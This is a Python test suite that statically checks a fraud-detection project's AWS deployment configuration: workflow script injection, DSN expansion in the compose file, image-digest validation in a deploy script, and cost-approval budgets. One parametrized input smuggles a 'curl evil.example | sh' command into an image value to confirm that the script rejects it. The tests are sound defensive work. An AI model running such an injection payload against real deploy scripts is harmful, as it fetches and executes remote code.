"""Cloud configuration that cannot be exercised without AWS, checked statically."""

from __future__ import annotations

import re
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

from ml.sagemaker_job import CostNotApprovedError, JobSpec, check_approval

ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = sorted((ROOT / ".github" / "workflows").glob("*.yml"))
UNTRUSTED = re.compile(r"\$\{\{\s*(inputs|github\.event|github\.head_ref|github\.actor)")
DEPLOY = ".github/workflows/deploy.yml"


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_workflows_never_paste_untrusted_values_into_scripts(path):
    """A ${{ }} in a run block is substituted before Bash parses it, so a value can run commands."""
    workflow = yaml.safe_load(path.read_text(encoding="utf-8"))
    for job in workflow["jobs"].values():
        for step in job["steps"]:
            assert not UNTRUSTED.search(step.get("run", "")), step.get("name")


def test_prod_dsns_are_expanded_by_a_shell():
    """Compose turns $$ into a literal $, and only a shell then expands it. In `environment:` the
    process would receive the placeholder text as its password."""
    compose = yaml.safe_load((ROOT / "infra/aws/compose.prod.yaml").read_text(encoding="utf-8"))
    for name, variable in (("api", "FRAUD_POSTGRES_DSN"), ("worker", "FRAUD_WORKER_POSTGRES_DSN")):
        service = compose["services"][name]
        assert variable not in service.get("environment", {})
        assert service["command"][:2] == ["sh", "-c"]
        assert f"export {variable}=postgresql://" in service["command"][2]


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
@pytest.mark.parametrize(
    ("value", "ok"),
    [
        ("123.dkr.ecr.us-east-1.amazonaws.com/fraud@sha256:" + "a" * 64, True),
        ("x'; curl evil.example | sh; echo '@sha256:" + "a" * 64, False),
        ("registry/repo:latest", False),
    ],
)
def test_host_script_rejects_anything_but_a_clean_digest(value, ok):
    line = next(
        ln
        for ln in (ROOT / "infra/aws/deploy.sh").read_text(encoding="utf-8").splitlines()
        if ln.startswith('[[ "$IMAGE"')
    )
    # shutil.which: on Windows a bare "bash" can start WSL, which drops the environment.
    result = subprocess.run(  # noqa: S603 - fixed script, value only reaches it through env
        [shutil.which("bash"), "-c", f"{line}; echo accepted"],
        capture_output=True,
        text=True,
        env={"IMAGE": value},
    )
    assert ("accepted" in result.stdout) is ok


def _spec() -> JobSpec:
    return JobSpec(
        job_name="j",
        image_uri="i",
        role_arn="r",
        instance_type="ml.m5.xlarge",
        output_s3="s3://o",
        input_s3=None,
        hyperparameters={},
        git_commit="c",
        estimated_hours=0.5,
        max_runtime_s=2700,
        estimated_cost_usd=0.13,
    )


@pytest.mark.parametrize("budget", [float("nan"), float("inf")])
def test_non_finite_budget_is_not_an_approval(budget):
    with pytest.raises(CostNotApprovedError):
        check_approval(_spec(), budget, "approver")
